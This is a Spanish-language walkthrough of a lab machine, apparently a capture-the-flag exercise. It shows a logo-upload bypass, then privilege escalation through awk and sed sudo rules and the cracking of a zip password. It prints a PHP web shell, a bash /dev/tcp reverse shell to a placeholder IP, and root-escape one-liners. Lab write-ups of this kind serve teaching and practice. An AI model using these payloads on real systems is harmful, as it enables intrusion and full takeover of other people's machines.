- Tags: #RCE #AbusoDeFileUpload #zip2john #sed #awk #escalarPrivilegios #base64Transfer
_______
comenzamos la maquina como siempre aplicando el escaneo tipico de nmap

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allport 
```

este escaneo nos reporta un puerto abierto, el puerto 80 http el cual aloja una pagina web 
_____
![](attachment/5b5a44132e80b1e7b3b2f5495d2c7600.png)
_____
investigando el codigo fuente encontraremos otro dominio al cual si queremos acceder tenemos que realizar virtual hosting para que la ip nos resuelva al dominio.

la url es la siguiente
_____
![](attachment/b252fa7ccf07d1a31d28ba5f77d92260.png)
_____
si ingresamos tendremos lo siguiente.
_____
![](attachment/6ad38690d8f3d3b2115577b3dc9a554f.png)
_____
antes de este panel encontraremos un panel de registro, nos registramos, para posteriormente ingresar con el usuario y clave que hayamos registrado.

si vamos a las opciones e ingresamos en la opción acerca de, veremos lo siguiente.
____
![](attachment/fabf23a64e482730154581eb51ab8d06.png)
_______
podemos buscar en con searchsploit para ver si existen vulnerabilidades.
____
![](attachment/1f865b04a16cfeef05c845f9e5f719e9.png)
_____
tenemos una vulnerabilidad para esa versión, veamos la prueba de concepto.

nos indica que debemos crear una nueva suscripción en  la pagina y en el apartado de cargar logotipo debemos cargar un archivo.php el cual debe tener el siguiente contenido.

```php
<?php
system($_GET['cmd']);
?>
```

ese archivo lo subiremos como el presunto logotipo pero esta petición la capturaremos con BurpSuite puesto que debemos colocar un parámetro mas en esa petición.

debemos agregar `GIF89a` arriba de la imagen, la petición que capturamos en el BurpSuite la transferimos al repeter para poder realizar este ultimo paso.
_______
![](attachment/b55f4c1448cd0faca180f4a588bf9fb9.png)
_______
ahora si enviamos la petición.
____
![](attachment/ff6ac071014d1941f9f1e394c0b537b8.png)
_____
obtenemos un código 200 y vemos que todo se realizo con éxito.

ahora debemos ir al siguiente directorio.

`http://VICTIM_IP/images/uploads/logos/XXXXXX-yourshell.php`

ahí encontraremos nuestro archivo .php.
______
![](attachment/19b83456d472023c4a163a32098221e0.png)
______
es aquí donde podremos ejecutar los comando agregando.

```php
?cmd=<comando>
```

al final de la url.
_____
![](attachment/94f17ca0f9365ef320ca6d0872bcd47d.png)
______
y vemos que tenemos ejecución de comando, por lo que ahora enviaremos una reverse shell a nuestra maquina para así ganar acceso.

```bash
bash -c "bash -i >%26 /dev/tcp/<direccion_ip>/<puerto> 0>%261"
```

esa es la reverse shell utilizada para ganar acceso a la maquina.

una vez dentro de la maquina tenemos que tratar la tty
_____
![](attachment/e78aee4c11aa9b5276af271b006616f9.png)
_______
posteriormente debemos buscar la forma de escalar privilegios.

si aplicamos un sudo -l veremos lo siguiente.
_____
![](attachment/e95040c2589178208379bbfbb476c66a.png)
_____
podemos ejecutar el comando awk como el usuario pylon, busquemos como escalar privilegios por este medio.

podemos ejecutar el siguiente comando para pivotar al usuario pylon.

```shell
sudo -u pylon awk 'BEGIN {system("/bin/bash")}'
```
___
![](attachment/2379c084e240f16f881c8d241f9a0399.png)
_____
ahora que somos el usuario pylon debemos buscar como seguir escalando privilegios.

puesto que si aplicamos el comando `cut -d: -f1 /etc/passwd` veremos existen 3 usuario, por lo que ahora vamos a pivotar al usuario pinguino.

si nos vamos al directorio de pylon veremos lo siguiente.
_____
![](attachment/f2c1aef72e98aeb033a20ebc8c42643a.png)
_____
tenemos un comprimido, y nos solicita contraseña para poder extraerlo.

el problema aquí es que tenemos pocos métodos de transferir el archivo a nuestra maquina. 

buscando en la web encontré que podemos transferir archivos mediante codificación base64, tenia mis duda acerca de este método, pero al final funciono.

acá la referencia de la web: https://infinitelogins.com/2020/04/24/transferring-files-via-base64/

el primer paso es codificar el comprimido, de la siguiente forma.
_____
![](attachment/37b3697c7dcb0e2ed45a8bc735fdc22a.png)
_______
tenemos que agregar la extensión .b64 al final del archivo, ahora aplicamos un cat al archivo para ver su contenido y copiarlo.
____
![](attachment/4a213c44ca01872962e8bbbbbb649112.png)
____
copiamos el contenido y lo metemos en un archivo en nuestra maquina de atacante.
________
![](attachment/bf8592d8e05409dd1a1ce6faef3f4b85.png)
____
ahora decodificamos el archivo.
___
![](attachment/4aaf8fb834645a8da03970f176edad90.png)
______
ahora podemos extraer el hash del comprimido para poder aplicar fuerza bruta con john.

para extraer el hash usaremos zip2john.
_____
![](attachment/7d732eedbd978c66d868893b04ae365b.png)
_____
ahora que lo tenemos, aplicaremos fuerza bruta con john.
_____
![](attachment/fb4644f6200c0d0a560152fa9aa22f1a.png)
____
tenemos la clave ahora podemos descomprimir el archivo.
_____
![](attachment/3e7dd8c9ddadde7fc4deed651663f5c0.png)
_____
nos deja un fichero.txt que nos permitirá pivotar al usuario pinguino mediante su contraseña.
_____
![](attachment/a8885ee7117765418d4876580b43bfad.png)
_____
podemos ejecutar el comando sed sin contraseña como root.

aplicaremos el siguiente comando para escalar a root

``` shell
sudo sed -n '1e exec bash 1>&0' /etc/hosts
```

______
![](attachment/bea8071963a3282b55f0f8fa480a7db8.png)
____
damos por culminada la maquina.

